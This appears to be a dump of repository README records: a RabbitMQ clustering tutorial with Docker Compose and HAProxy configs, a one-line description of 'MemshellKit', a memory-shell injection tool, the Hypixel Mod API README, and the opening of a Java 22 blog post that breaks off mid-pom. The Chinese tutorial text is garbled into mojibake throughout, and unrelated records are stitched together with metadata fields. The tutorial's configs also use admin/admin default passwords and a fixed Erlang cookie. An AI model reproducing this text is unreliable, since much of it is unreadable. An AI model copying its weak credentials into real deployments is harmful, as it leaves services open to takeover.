    // å¯ä»¥ä½¿ç”¨@Payloadæ³¨è§£ï¼Œæ ‡è¯†è¯¥æ–¹æ³•çš„å‚æ•°æ˜¯æ¶ˆæ¯ä½“
    public void receiveMessages(@Payload String message, Channel channel,
                                @Headers Map<String, Object> headers) {
        System.out.println(""==========================="");
        Employee employee = gson.fromJson(message, Employee.class);
        System.out.println(""æ¥æ”¶åˆ°æ¶ˆæ¯ï¼šå‘˜å·¥ç¼–å·ï¼š"" + employee.getNumber()
                + ""ï¼Œå‘˜å·¥å§“åï¼š"" + employee.getName()
                + ""ï¼Œå‘˜å·¥å¹´é¾„ï¼š"" + employee.getAge());
        try {
            // æ‰‹åŠ¨ackç¡®è®¤
            channel.basicAck((Long) headers.get(AmqpHeaders.DELIVERY_TAG), false);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        System.out.println(""==========================="");
    }

}
```

7.ç¼–å†™æµ‹è¯•ç±»`SpringbootRabbitmqApplicationTests`ï¼Œç”¨äºæµ‹è¯•æ¶ˆæ¯å‘é€ã€‚

```java

@SpringBootTest
class SpringbootApplicationTests {

    @Autowired
    private MessageProducer messageProducer;

    @Test
    void testSendMsg() {
        messageProducer.sendMessages(new Employee(""1001"", ""å¼ ä¸‰"", 25));
    }

}
```

8.å¯åŠ¨é¡¹ç›®ï¼Œåœ¨æ§åˆ¶å°æŸ¥çœ‹æ—¥å¿—ï¼Œè§‚å¯Ÿæ¶ˆæ¯å’Œæ¥æ”¶æƒ…å†µã€‚

## 15-RabbitMQé›†ç¾¤æ¶æ„æ¨¡å¼

**RabbitMQé›†ç¾¤åŒ…å«å››ç§æ¶æ„æ¨¡å¼ï¼š**

| æ¶æ„æ¨¡å¼             | æè¿°                                                                |
|------------------|-------------------------------------------------------------------|
| ä¸»å¤‡æ¨¡å¼(Warren)     | ä¸»èŠ‚ç‚¹è´Ÿè´£è¯»å†™ï¼Œä»èŠ‚ç‚¹è´Ÿè´£å¤‡ä»½ï¼Œä¸»èŠ‚ç‚¹æ•…éšœæ—¶ä»èŠ‚ç‚¹æ¥ç®¡ã€‚                                      |
| è¿œç¨‹æ¨¡å¼(Shovel)     | åŒæ´»æ¨¡å¼ï¼ˆå®¹ç¾ï¼‰ï¼Œå¯å®ç°è·¨åœ°åŸŸèŠ‚ç‚¹ä¹‹é—´ç›¸äº’å¤åˆ¶æ•°æ®ã€‚<br />ç‰ˆæœ¬å¿…é¡»ç»Ÿä¸€ï¼Œç½‘ç»œè¦æ±‚é«˜ï¼Œé…ç½®å¤æ‚ï¼Œæ—©æœŸç‰ˆæœ¬ä¸æ”¯æŒï¼Œå·²ç»è¢«æ·˜æ±°äº†  |
| **é•œåƒæ¨¡å¼(Mirror)** | æ¯ä¸ªé˜Ÿåˆ—æœ‰å¤šä¸ªé•œåƒï¼Œä¿è¯æ•°æ®100%ä¸ä¸¢å¤±ï¼Œæä¾›é«˜å¯ç”¨æ€§ã€‚                                     |
| å¤šæ´»æ¨¡å¼(Federation) | å®ç°è·¨é›†ç¾¤æ¶ˆæ¯ä¼ é€’å’Œæ•°æ®åŒæ­¥ã€‚<br />å¼‚åœ°æ•°æ®å¤åˆ¶çš„ä¸»æµæ–¹æ¡ˆï¼Œä¾èµ–`fedration`æ’ä»¶ï¼Œé…ç½®ç®€å•ï¼Œæ€§èƒ½é«˜ï¼Œæ”¯æŒå¤šç§åè®®ã€‚ |

## 16-æ­å»ºMirroré•œåƒé›†ç¾¤

> **é•œåƒæ¨¡å¼**ï¼šæ¯ä¸ªé˜Ÿåˆ—æœ‰å¤šä¸ªé•œåƒï¼Œä¿è¯æ•°æ®100%ä¸ä¸¢å¤±ï¼Œæä¾›é«˜å¯ç”¨æ€§ã€‚

**ä½¿ç”¨Docker-Composeæ­å»ºRabbitMQé›†ç¾¤ã€‚**

**1.åˆ›å»ºdocker-compose.ymlæ–‡ä»¶**

```yaml
# å®šä¹‰ Docker Compose æ–‡ä»¶ç‰ˆæœ¬
version: '3.13.0-beta.1'

# å®šä¹‰æœåŠ¡
services:

  # RabbitMQ èŠ‚ç‚¹ 1
  rabbitmq-node1:
    image: rabbitmq:3.13-management
    hostname: rabbitmq-node1
    ports:
      - ""5673:5672""
      - ""15673:15672""
    environment:
      RABBITMQ_ERLANG_COOKIE: ""secret_cookie"" # é›†ç¾¤å†…èŠ‚ç‚¹æŒæœ‰ç›¸åŒçš„ /var/lib/rabbitmq/.erlang.cookie æ–‡ä»¶æ‰å…è®¸å½¼æ­¤é€šä¿¡
      RABBITMQ_DEFAULT_USER: ""admin""
      RABBITMQ_DEFAULT_PASS: ""admin""
      RABBITMQ_NODENAME: ""rabbit@rabbitmq-node1""
    volumes:
      - rabbitmq-node1-data:/var/lib/rabbitmq

  # RabbitMQ èŠ‚ç‚¹ 2
  rabbitmq-node2:
    image: rabbitmq:3.13-management
    hostname: rabbitmq-node2
    ports:
      - ""5674:5672""
      - ""15674:15672""
    environment:
      RABBITMQ_ERLANG_COOKIE: ""secret_cookie""  # é›†ç¾¤å†…èŠ‚ç‚¹æŒæœ‰ç›¸åŒçš„ /var/lib/rabbitmq/.erlang.cookie æ–‡ä»¶æ‰å…è®¸å½¼æ­¤é€šä¿¡
      RABBITMQ_DEFAULT_USER: ""admin""
      RABBITMQ_DEFAULT_PASS: ""admin""
      RABBITMQ_NODENAME: ""rabbit@rabbitmq-node2""
    volumes:
      - rabbitmq-node2-data:/var/lib/rabbitmq

# å®šä¹‰æ•°æ®å·
volumes:
  rabbitmq-node1-data:
  rabbitmq-node2-data:
```

**2.å¯åŠ¨é›†ç¾¤**

```shell
docker-compose up -d
```

**3.è®¿é—®ç®¡ç†ç•Œé¢**

* [http://localhost:15673](http://localhost:15673)
* [http://localhost:15674](http://localhost:15674)

4.**ä¿æŒä¸€è‡´çš„Erlang Cookie**

```
docker-compose exec rabbitmq-node2 bash
echo ""DAOMNSRTDZIIJEAGXCSH"" > /var/lib/rabbitmq/.erlang.cookie
```

**5.é‡å¯èŠ‚ç‚¹**

```shell
docker-compose restart rabbitmq-node2
```

**6.åŠ å…¥é›†ç¾¤**

```shell
docker-compose exec rabbitmq-node1 bash
rabbitmqctl stop_app
rabbitmqctl join_cluster rabbit@rabbitmq-node2
rabbitmqctl start_app
```

**7.éªŒè¯é›†ç¾¤çŠ¶æ€**

```shell
rabbitmqctl cluster_status
```

ä½ å¯ä»¥çœ‹åˆ°æ‰€æœ‰èŠ‚ç‚¹éƒ½æ˜¾ç¤ºåœ¨é›†ç¾¤ä¸­ï¼Œå¹¶ä¸”çŠ¶æ€ä¸º ""**Running Nodes**""ã€‚è¿™è¡¨æ˜æ‰€æœ‰èŠ‚ç‚¹éƒ½å·²æˆåŠŸåŠ å…¥é›†ç¾¤ã€‚

![Nodesé›†ç¾¤](http://img.geekyspace.cn/pictures/2024/202405221718023.png)

## 17-Haproxyé…ç½®MQé›†ç¾¤è´Ÿè½½å‡è¡¡

**é•œåƒæ¨¡å¼é‡åˆ°çš„é—®é¢˜**

* é—®é¢˜æè¿°ï¼š åœ¨ RabbitMQ é›†ç¾¤çš„é•œåƒæ¨¡å¼ä¸­ï¼ŒJava å®¢æˆ·ç«¯åªèƒ½ç›´è¿åˆ°ä¸€ä¸ªèŠ‚ç‚¹ï¼Œæ— æ³•å®ç°è´Ÿè½½å‡è¡¡ã€‚
* å½±å“ï¼š è¿™å¯èƒ½å¯¼è‡´å•ä¸ªèŠ‚ç‚¹çš„è´Ÿè½½è¿‡é‡ï¼Œè€Œå…¶ä»–èŠ‚ç‚¹è´Ÿè½½è¾ƒè½»æˆ–å¤„äºç©ºé—²çŠ¶æ€ï¼Œæ— æ³•å……åˆ†åˆ©ç”¨é›†ç¾¤çš„èµ„æºã€‚

**è§£å†³æ–¹æ¡ˆï¼šä½¿ç”¨HAProxyä»£ç†æœåŠ¡å™¨**

* HAProxyæ¦‚è¿°ï¼š HAProxyæ˜¯ä¸€ä¸ªå¼€æºçš„è½¯ä»¶è´Ÿè½½å‡è¡¡å™¨ï¼Œæ”¯æŒTCPï¼ˆç¬¬4å±‚ï¼‰å’ŒHTTPåè®®ï¼ˆç¬¬7å±‚ï¼‰ã€‚
* åœ¨RabbitMQé›†ç¾¤ä¸­çš„è§’è‰²ï¼š HAProxyç”¨ä½œTcpè´Ÿè½½å‡è¡¡å™¨ï¼ˆLB-LoadBalanceï¼‰ä¸æ•…éšœå‘ç°ã€‚

**é…ç½®HAProxyä¸MQé›†ç¾¤**

[å®˜ç½‘](http://www.haproxy.org/) ï½œ [æ–‡æ¡£](https://docs.haproxy.org/) ï½œ [éªŒè¯é…ç½®](https://www.baeldung.com/linux/haproxy-config-files)

**ä½¿ç”¨Docker-Composeé…ç½®HAProxy**

```yml
# å®šä¹‰ Docker Compose æ–‡ä»¶ç‰ˆæœ¬
version: '3.13.0-beta.2'

# å®šä¹‰æœåŠ¡
services:

  # RabbitMQ èŠ‚ç‚¹ 1
  rabbitmq-node1:
    image: rabbitmq:3.13-management
    hostname: rabbitmq-node1
    ports:
      - ""5673:5672""
      - ""15673:15672""
    environment:
      RABBITMQ_ERLANG_COOKIE: ""secret_cookie""
      RABBITMQ_DEFAULT_USER: ""admin""
      RABBITMQ_DEFAULT_PASS: ""admin""
      RABBITMQ_NODENAME: ""rabbit@rabbitmq-node1""
    volumes:
      - rabbitmq-node1-data:/var/lib/rabbitmq
    networks:
      - rabbitmq_network

  # RabbitMQ èŠ‚ç‚¹ 2
  rabbitmq-node2:
    image: rabbitmq:3.13-management
    hostname: rabbitmq-node2
    ports:
      - ""5674:5672""
      - ""15674:15672""
    environment:
      RABBITMQ_ERLANG_COOKIE: ""secret_cookie""
      RABBITMQ_DEFAULT_USER: ""admin""
      RABBITMQ_DEFAULT_PASS: ""admin""
      RABBITMQ_NODENAME: ""rabbit@rabbitmq-node2""
    volumes:
      - rabbitmq-node2-data:/var/lib/rabbitmq
    networks:
      - rabbitmq_network

  # HAProxy è´Ÿè½½å‡è¡¡å™¨
  haproxy:
    image: haproxy:3.0-dev12-bookworm
    ports:
      - ""5672:5672""
      - ""1080:1080""
    volumes:
      - ./haproxy.cfg:/usr/local/etc/haproxy/haproxy.cfg:ro
    networks:
      - rabbitmq_network
    depends_on:
      - rabbitmq-node1
      - rabbitmq-node2

# å®šä¹‰æ•°æ®å·
volumes:
  rabbitmq-node1-data:
  rabbitmq-node2-data:

# å®šä¹‰ç½‘ç»œ
networks:
  rabbitmq_network:
    driver: bridge
```

åˆ›å»ºåä¸º `haproxy.cfg` çš„æ–‡ä»¶ï¼Œå¹¶æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š

```shell
#---------------------------------------------------------------------
# å…¨å±€è®¾ç½®
#---------------------------------------------------------------------
global
    default-path config
    log stderr local0 info
    maxconn 4000
    user haproxy
    group haproxy
    # ä»¥å®ˆæŠ¤è¿›ç¨‹æ–¹å¼è¿è¡Œ
    daemon

#---------------------------------------------------------------------
# é»˜è®¤è®¾ç½®
#---------------------------------------------------------------------
defaults
    log global
    maxconn 3000
    mode tcp
    option tcplog
    option dontlognull
    # é‡è¯•æ¬¡æ•°
    retries 3
    # è¿æ¥è¶…æ—¶è®¾ç½®
    timeout connect 10s
    timeout client 1m
    timeout server 1m

#---------------------------------------------------------------------
# RabbitMQ é›†ç¾¤ç›‘å¬
#---------------------------------------------------------------------
listen rabbitmq_cluster
    bind 0.0.0.0:5672
    mode tcp
    option tcplog
    option dontlognull
    # è´Ÿè½½å‡è¡¡ç®—æ³•ï¼šè½®è¯¢
    balance roundrobin
    # è¿æ¥è¶…æ—¶è®¾ç½®
    timeout connect 1s
    timeout client 10s
    timeout server 10s
    # å®šä¹‰ RabbitMQ èŠ‚ç‚¹ï¼Œå¹¶é…ç½®å¥åº·æ£€æŸ¥å‚æ•°ï¼Œæ¯ 5 ç§’æ£€æŸ¥ä¸€æ¬¡ï¼Œè¿ç»­ 2 æ¬¡æˆåŠŸåè®¤ä¸ºèŠ‚ç‚¹å¥åº·ï¼Œè¿ç»­ 3 æ¬¡å¤±è´¥åè®¤ä¸ºèŠ‚ç‚¹ä¸å¥åº·
    server rabbitmq-node1 rabbitmq-node1:5672 check inter 5s rise 2 fall 3
    server rabbitmq-node2 rabbitmq-node2:5672 check inter 5s rise 2 fall 3

#---------------------------------------------------------------------
# HAProxy ç›‘æ§æ¥å£
#---------------------------------------------------------------------
listen stats
    bind 0.0.0.0:1080
    mode http
    # å¯ç”¨ç›‘æ§åŠŸèƒ½
    stats enable
    # ç›‘æ§é¡µé¢ uriï¼Œå¯ä»¥é€šè¿‡ http://ip:1080/haproxy?stats è®¿é—®ï¼Œç”¨æˆ·å adminï¼Œå¯†ç  admin
    stats uri /haproxy?stats
    stats refresh 30s
    stats auth admin:admin
```

**éªŒè¯ä¸æµ‹è¯•**

1. å¯åŠ¨é›†ç¾¤`docker-compose up -d`
2. è®¿é—®RabbitMQç®¡ç†ç•Œé¢
   * åœ¨æµè§ˆå™¨ä¸­è®¿é—®ï¼š[http://localhost:15673](http://localhost:15673) å’Œ [http://localhost:15674](http://localhost:15674)
   * ä½¿ç”¨é»˜è®¤ç”¨æˆ·åå’Œå¯†ç  `admin`/`admin` ç™»å½•
3. æ£€æŸ¥HAProxyç›‘æ§ç•Œé¢
   * åœ¨æµè§ˆå™¨ä¸­è®¿é—®ï¼š[http://localhost:1080/haproxy?stats](http://localhost:1080/haproxy?stats)
   * ä½¿ç”¨ç”¨æˆ·å `admin` å’Œå¯†ç  `admin` ç™»å½•æŸ¥çœ‹HAProxyçŠ¶æ€å’ŒèŠ‚ç‚¹å¥åº·çŠ¶å†µ

![è®¿é—®æµ‹è¯•](https://img.geekyspace.cn/pictures/2024/image-20240614213856305.png)

> HaProxy æŒ‚æ‰çš„æƒ…å†µä¸‹ï¼ŒRabbitMQ é›†ç¾¤ä»ç„¶å¯ä»¥æ­£å¸¸å·¥ä½œï¼Œä½†æ˜¯æ— æ³•å®ç°è´Ÿè½½å‡è¡¡ã€‚
> éœ€è¦ä¿è¯ HaProxy çš„é«˜å¯ç”¨æ€§ï¼Œå¯ä»¥ä½¿ç”¨ Keepalived + HaProxy å®ç°ã€‚

## 18-å®¢æˆ·ç«¯è®¿é—®MQé›†ç¾¤

ç›´æ¥å‚è€ƒä½¿ç”¨[ç‚¹å¯¹ç‚¹`helloworld`æ¨¡å¼](#4-ç‚¹å¯¹ç‚¹mqé€šä¿¡)çš„ä»£ç 

* `Host` è¿æ¥åœ°å€æ”¹ä¸ºHaProxyæœåŠ¡åœ°å€
* `Prot` æ”¹ä¸ºHaProxyæœåŠ¡ç«¯å£

## 19-RabbitMQå¦‚ä½•å®ç°å¯é æ€§æŠ•é€’

åœ¨RabbitMQä¸ºä»£è¡¨çš„æ¶ˆæ¯ä¸­é—´ä»¶ä¸­ï¼Œå“ªäº›åœºæ™¯å¯èƒ½ä¼šå¯¼è‡´æ¶ˆæ¯ä¸¢å¤±ï¼Ÿå¦‚ä½•åº”å¯¹ï¼Ÿ

**æ¶ˆæ¯æŠ•é€’çš„ä¸‰é˜¶æ®µ**

* ç”Ÿäº§é˜¶æ®µã€å­˜å‚¨é˜¶æ®µã€æ¶ˆè´¹é˜¶æ®µ

![æ¶ˆæ¯æŠ•é€’çš„ä¸‰é˜¶æ®µ](https://img.geekyspace.cn/pictures/2024/image-20240615234228537.png)

**æ¶ˆæ¯ç¡®è®¤åº”ç­”æœºåˆ¶**

RabbitMQåœ¨æ¶ˆæ¯æŠ•é€’è¿‡ç¨‹ä¸­ï¼Œå……å½“ä»£ç†äººï¼ˆBrokerï¼‰çš„è§’è‰²ï¼Œä¸ºäº†ç¡®ä¿æ¶ˆæ¯çš„å¯é æ€§ä¼ é€’ï¼Œ
RabbitMQæä¾›äº†ç”Ÿäº§é˜¶æ®µçš„**Confirm**å’Œ**Return**æœºåˆ¶ï¼Œä»¥åŠæ¶ˆè´¹è€…ç«¯çš„æ‰‹åŠ¨ackç¡®è®¤ã€‚

![Confirm & Return](https://img.geekyspace.cn/pictures/2024/image-20240615200122236.png)

**åˆ†æä¸åŒé˜¶æ®µè¦é‡‡å–çš„æªæ–½ã€‚**

| é˜¶æ®µ     | ç›®æ ‡                               | æªæ–½                                                                           |
|--------|----------------------------------|------------------------------------------------------------------------------|
| **å‘é€** | ç¡®ä¿æ¶ˆæ¯å¯é å‘é€åˆ°Broker                  | - å¤šæ¬¡é‡å‘æœºåˆ¶ï¼Œç›´åˆ°Broker ackç¡®è®¤æ¥æ”¶<br> - è¿‡ç¨‹ä¸­Brokerä¼šè‡ªåŠ¨å»é‡<br> - è¶…æ—¶Produceräº§ç”Ÿå¼‚å¸¸ï¼Œåº”ç”¨è¿›è¡Œæ•è·æç¤º |
| **å­˜å‚¨** | ç¡®ä¿æ¶ˆæ¯åœ¨Brokerç«¯å®‰å…¨å­˜å‚¨                 | - Brokerå…ˆåˆ·ç›˜å†ackç¡®è®¤ï¼Œå³ä½¿ackå¤±è´¥ä¹Ÿä¸ä¼šä¸¢å¤±æ¶ˆæ¯<br> - å¤šæ¬¡é‡è¯•ç›´åˆ°Produceræ¥æ”¶ï¼Œå¯èƒ½å¯¼è‡´æ¶ˆæ¯ç§¯å‹             |
| **æ¶ˆè´¹** | ç¡®ä¿æ¶ˆæ¯å¯é ä¼ é€’åˆ°Consumer<br>å¹¶ä¸”æ¯æ¡æ¶ˆæ¯åªå¤„ç†ä¸€æ¬¡ | - Brokerå‘Consumeræ¨é€æ¶ˆæ¯ï¼Œæœªæ¥æ”¶æ—¶è‡ªåŠ¨é‡å‘ï¼Œç›´åˆ°Consumer ackç¡®è®¤<br> - Consumeræ³¨æ„å¹‚ç­‰æ€§å¤„ç†        |

**å…¶ä»–é’ˆå¯¹æ€§çš„ä¼˜åŒ–ç­–ç•¥**

1. å¼‚æ­¥åˆ·ç›˜ï¼ˆNSYNC_FLUSHï¼‰ï¼Œæ”¹ä¸ºåŒæ­¥åˆ·ç›˜
2. é¿å…å­˜å‚¨ä»‹è´¨æŸåï¼Œå»ºè®®é‡‡ç”¨ç›˜[RAID10](https://baike.baidu.com/item/RAID%2010/5641657)æˆ–åˆ†å¸ƒå¼å­˜å‚¨
3. ä¸è¦å¯åŠ¨è‡ªåŠ¨Ackï¼ŒRawAckå­˜åœ¨æ­¤é—®é¢˜
4. é¿å…éƒ½å¸‚ä¼ è¯´ActiveMQ

## 20-æŠ½pullä¸æ¨pushåœ¨é«˜å¹¶å‘åœºæ™¯çš„é€‰å‹

**å¾®åšåœ¨æ¨é€æ¨¡å¼ä¸‹çš„åº”ç”¨å®è·µ**

![å¾®åšæ¨é€æ¨¡å¼](https://img.geekyspace.cn/pictures/2024/image-20240616001557168.png)

**å¾®åšåœ¨æŠ½å–æ¨¡å¼ä¸‹çš„åº”ç”¨å®è·µ**

![å¾®åšæŠ½å–æ¨¡å¼](https://img.geekyspace.cn/pictures/2024/image-20240616001650920.png)

**æ¨é€Pushå’Œæ‹‰å–Pullçš„å¯¹æ¯”**

| ç‰¹æ€§    | Pushæ¨¡å¼                                   | Pullæ‹‰å–æ¨¡å¼                               |
|-------|------------------------------------------|----------------------------------------|
| å®æ—¶æ€§   | è¾ƒå¥½ï¼Œé€šè¿‡ç½‘ç»œç®¡é“å‡†å®æ—¶å‘é€                           | è¾ƒå·®ï¼Œå–å†³äºå®šæ—¶è½®è¯¢æ—¶é—´                           |
| æœåŠ¡å™¨çŠ¶æ€ | æœ‰çŠ¶æ€ï¼Œéœ€æŒä¹…åŒ–ç²‰ä¸åŠ¨æ€é˜Ÿåˆ—                           | æ— çŠ¶æ€ï¼Œæ ¹æ®è¯·æ±‚å®æ—¶æŸ¥è¯¢                           |
| é£é™©é¡¹   | å¤§VåŠ¨æ€çš„å¹¶å‘â€œ==å†™æ‰©æ•£==â€é—®é¢˜<br />å¤§é‡åŠ¨æ€é˜Ÿåˆ—æŒä¹…åŒ–é€ æˆç£ç›˜é«˜IO | å¤§é‡ç²‰ä¸å‡†ç‚¹â€œ==è¯»æ‰©æ•£==â€é—®é¢˜<br />å¤§Vç²‰ä¸å‡†ç‚¹å¹¶å‘æŸ¥è¯¢æå®æœåŠ¡å™¨ |
| åº”ç”¨åœºæ™¯  | å¾®ä¿¡                                       | å¾®åš(æ—©æœŸ)                                 |

**å†™æ‰©å±•ï¼ˆPushï¼‰ä¼˜åŒ–**

* è®¾ç½®ä¸Šé™ï¼Œå¾®ä¿¡å¥½å‹ä¸Šé™5000
* é™æµç­–ç•¥ï¼Œå¾®ä¿¡æ¯åˆ†é’Ÿé™åˆ¶å‘é€æ¬¡æ•°
* ä¼˜åŒ–å­˜å‚¨ç­–ç•¥ï¼Œé‡‡ç”¨NoSQLæˆ–å¤§æ•°æ®æ–¹æ¡ˆ

**è¯»æ‰©å±•ï¼ˆPullï¼‰ä¼˜åŒ–**

* MQå‰Šå³°å¡«è°·ï¼Œè¶…é•¿é˜Ÿåˆ—ç›´æ¥æ‹’ç»
* å¢åŠ è½®è¯¢é—´éš”ï¼Œå‡å°‘è¯·æ±‚æ¬¡æ•°
* æœåŠ¡ç«¯å¢åŠ ç¼“å­˜ï¼Œä¼˜åŒ–æŸ¥è¯¢æ•ˆç‡
* å¢åŠ éªŒè¯ç ï¼Œåˆ†æ•£æ—¶é—´ï¼Œå‡å°‘æœºå™¨äººåˆ·å–

æ¨ç‰¹ï¼ˆTwitterï¼‰åœ¨é«˜å¹¶å‘åœºæ™¯ä¸‹ï¼Œé‡‡ç”¨äº†æ¨æ‹‰ç»“åˆçš„æ–¹å¼ï¼Œå³**æ¨æ‹‰ç»“åˆ**ã€‚
* å½“ç²‰ä¸æ•°è¾ƒå°‘æ—¶ï¼Œé‡‡ç”¨æ¨é€æ¨¡å¼
* å½“ç²‰ä¸æ•°è¾ƒå¤šæ—¶ï¼Œé‡‡ç”¨æ‹‰å–æ¨¡å¼
",0,0,1,0.0,"['late', 'rabbitmq', 'spring', 'boot', 'docker', 'compose', 'rabbitmq', 'rabbitmq', 'docker', 'compose', 'rabbitmq', 'rabbitmq', 'haproxy', 'rabbitmq', 'rabbitmq', 'haproxy', 'http', 'stats', 'admin']","['rabbitmq', 'docker', 'compose', 'haproxy', 'late']",3.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,3.0,0.0
W01fh4cker/MemshellKit,main,"# MemshellKit
é’ˆå¯¹å¤šä¸ªæ¡†æ¶çš„å†…å­˜é©¬ä¸€é”®æ‰“å…¥å·¥å…· | A powerful tool for injecting memory shells for multiple frameworks.
",0,0,1,0.0,['memshellkit'],['memshellkit'],1.0,[],0.0,1.0,0.0
HypixelDev/ModAPI,master,"# Hypixel Mod API

The Hypixel Mod API is an implementation of custom packets for communicating with the Hypixel Server via plugin
messages.

## Mod Distributions

Official downloads of the Hypixel Mod API can be found on [Modrinth](https://modrinth.com/mod/hypixel-mod-api).
To install the mod, simply download the JAR file and place it in your mods folder.

Currently, the Hypixel Mod API supports the following mod loaders and versions:

- [Fabric Latest](https://github.com/HypixelDev/FabricModAPI)
- [Forge 1.8.9](https://github.com/HypixelDev/ForgeModAPI)

If there is significant demand, support for additional versions and loaders may be considered.

## Developer Usage

It is recommended to read over the [FAQ](https://github.com/HypixelDev/ModAPI/wiki/FAQ) on the GitHub Wiki before implementing the Mod API.

For using the Mod API you will need to add it as a dependency to your project. This can be done via the public
Hypixel Maven repository.

```xml

<repository>
    <id>Hypixel</id>
    <url>https://repo.hypixel.net/repository/Hypixel/</url>
</repository>
```

This repo can also be used with Gradle.

```gradle
repositories {
    maven { url 'https://repo.hypixel.net/repository/Hypixel/' }
}
```

You can then include the dependency in your project.

```xml

<dependency>
    <groupId>net.hypixel</groupId>
    <artifactId>mod-api</artifactId>
    <version>1.0.1</version>
</dependency>
```

```gradle
dependencies {
    implementation 'net.hypixel:mod-api:1.0.1'
}
```

Depending on your chosen mod loader, you will need to also include the `hypixel-mod-api` as a required dependency. For
example in Fabric you would include the following in your `fabric.mod.json` file.

```json
{
  ""depends"": {
    ""hypixel-mod-api"": "">=1.0.1""
  }
}
```

## Example Usage

Once you have the API added to your project you can start using it. Below are examples of sending server-bound packets,
as well as receiving client-bound packets.

### Sending a Hypixel Packet

```java
public class Example {
    public void sendPacket() {
        HypixelModAPI.getInstance().sendPacket(new ServerboundPartyInfoPacket());
    }
}
```

### Registering a packet handler

```java

public class Example {
    public void registerPacketHandler() {
        HypixelModAPI.getInstance().createHandler(ClientboundLocationPacket.class, packet -> {
            packet.getServerName();
        });
    }
}
```

### Subscribing to a packet event

If you wish to receive a specific event packet, you will need to subscribe to the event. Once subscribed you can
register a packet handler as normal (see example above).

```java
public class Example {
    public void subscribeToPacketEvent() {
        HypixelModAPI.getInstance().subscribeToEventPacket(ClientboundLocationPacket.class);
    }
}
```

Registering for an event packet is only required one time during the Minecraft client lifecycle. You can register for
event packets at anytime, including in your mod initialization code before the player has connected.

The implementation of the Mod API will automatically notify the server of any registered events when receiving
the `ClientboundHelloPacket`.
",10,0,3,23.0,"['hypixel', 'mod', 'api', 'mod', 'distribution', 'developer', 'usage', 'example', 'usage', 'send', 'hypixel', 'packet', 'register', 'packet', 'handler', 'subscribe', 'packet', 'event']","['packet', 'hypixel', 'mod', 'usage', 'api']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-shade-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin]",0.0,1.0,0.0
spring-tips/java22,main,"# Hello, Java 22

Hi, Spring fans! Happy [Java 22](https://blogs.oracle.com/java/post/the-arrival-of-java-22) release day, to those who
celebrate! Did you get the bits already? Go, go, go! Java 22 is a _significant_ improvement that I think is a worthy
upgrade for everyone. There are some big, final released features, like Project Panama, and a slew of even-better
preview features. I couldn't hope to cover them all, but I did want to touch on a few of my favorites. We're going to touch on a number of features. The code, if you want to follow along at home, [is  here (`https://github.com/spring-tips/java22`)](https://github.com/spring-tips/java22).

I love Java 22, and of course, I love GraalVM, and both have releases today! Java is of course our favorite runtime and
language, and GraalVM is a high-performance JDK distribution that supports additional languages and allows
ahead-of-time (AOT) compilation (they're called GraalVM native images). GraalVM includes all the niceties of the new
Java 22 release, with some extra utilities, so I always recommend just downloading that one. I'm interested,
specifically, in the GraalVM native image capability. The resulting binaries start almost instantly and take
considerably less RAM compared to their JRE cousins. GraalVM isn't new, but it's worth remembering that Spring Boot has
a great engine to support turning your Spring Boot applications into GraalVM native images.

## Installation

Here's what I did.

I'm using the fantastic [SDKMAN](https://sdkman.io) package manager for Java. I'm also running on an Apple Silicon chip running macOS. This, and the fact that I like and encourage the use of GraalVM, will be somewhat important later, so don't forget. There'll be a test! I installed a pre-release download of the [GraalVM Community Edition](https://www.graalvm.org/community/), which I downloaded [from here](https://github.com/graalvm/oracle-graalvm-ea-builds/releases/tag/jdk-22.0.0-ea.07). GraalVM Community is the opensource version. GraalVM also have a commercial release, which is _free_, but not opensource. I'm not a lawyer, but my understanding is that you can use it as much as you like. The GraalVM team will remind you that it allows you to build even faster native images through technologies like profile guided optimization (PGO). I then unzipped it and installed it manually using the SDKMAN command line utility, like this: `sdk install java 22.07-graalce $HOME/bin/graalvm-jdk-22+36.1/Contents/Home`.  Then I did: `sdk default java 22.07-graalce` and opened up a new shell. Verify that everything is working by typing `javac --version` and `java --version` and `native-image --version`. By the time you read this, however, you probably won't need to do any of this. It'll have been released on SDKMAN itself. Just do `sdk list java` and if you see `22-graalce` (or something like that), then install that: `sdk install java 22-graalce`. Or, if you're reading this in the far-flung future  (do we have flying cars yet?) and there's `50-graalce`, then by all the means install that! Bigger versions are better!          


## You Gotta Start Somewhere...

At this point, I wanted to start building! So, I went to my second favorite place on the internet, the Spring Initializr - [start.spring.io](https://start.spring.io) - and generated a new project, using the following specifications:

* I selected the `3.3.0-snapshot` version of Spring Boot. 3.3 is not yet GA, but it should be in a few short months. In the meantime, onward and upward! This release has better support for Java 22.
* I selected `Maven` as the build tool.
* I added `GraalVM Native Support` support, `H2 Database`, and  `JDBC API` support.

I opened the project in my IDE, like this: `idea pom.xml`. Now I needed to configure a few of the Maven plugins to support both Java 22 and some of the preview features we're going to look at in this article. Here's my fully configured `pom.xml`. It's a little dense, so I'll see you after the code for the walkthrough.

```pom
<?xml version=""1.0"" encoding=""UTF-8""?>
<project xmlns=""http://maven.apache.org/POM/4.0.0"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
         xsi:schemaLocation=""http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"">
    <modelVersion>4.0.0</modelVersion>
    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>3.3.0-SNAPSHOT</version>
        <relativePath/> <!-- lookup parent from repository -->
    </parent>
    <groupId>com.example</groupId>
    <artifactId>demo</artifactId>
    <version>0.0.1-SNAPSHOT</version>
    <name>demo</name>
    <description>Demo project for Spring Boot</description>
    <properties>
        <java.version>22</java.version>
    </properties>
    <dependencies>

        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-jdbc</artifactId>
        </dependency>
        <dependency>
            <groupId>com.h2database</groupId>
            <artifactId>h2</artifactId>
            <scope>runtime</scope>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter</artifactId>
        </dependency>
        <dependency>
            <groupId>org.graalvm.sdk</groupId>
            <artifactId>graal-sdk</artifactId>
            <version>23.1.2</version>
        </dependency>
        <dependency>
            <groupId>org.graalvm.nativeimage</groupId>
            <artifactId>svm</artifactId>
           

 <version>23.1.2</version>
            <scope>provided</scope>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
